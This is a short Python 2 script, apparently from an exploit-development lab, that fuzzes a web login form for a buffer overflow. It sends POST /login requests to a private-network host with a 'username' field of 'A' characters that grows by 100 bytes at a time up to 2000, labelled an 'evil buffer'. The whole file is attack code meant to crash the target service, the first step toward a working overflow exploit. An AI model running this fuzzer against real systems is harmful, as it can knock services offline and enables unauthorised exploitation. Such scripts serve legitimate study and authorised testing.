#!/usr/bin/python
import socket
import time
import sys

size = 100

while(size < 2000):

  try:
    print "\nSending evil buffer with %s bytes..." % size

    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"
    
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.214.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Referer: http://192.168.214.10/login\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "DNT: 1\r\n"
    buffer += "Connection: keep-alive\r\n"
    buffer += "Upgrade-Insecure-Requests: 1\r\n"
    buffer += "\r\n"
    
    buffer += content
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.214.10", 80))
    s.send(buffer)

    s.close()

    size += 100
    time.sleep(10)

    print "Done!"

  except:
    print "Could not connect!"
    sys.exit()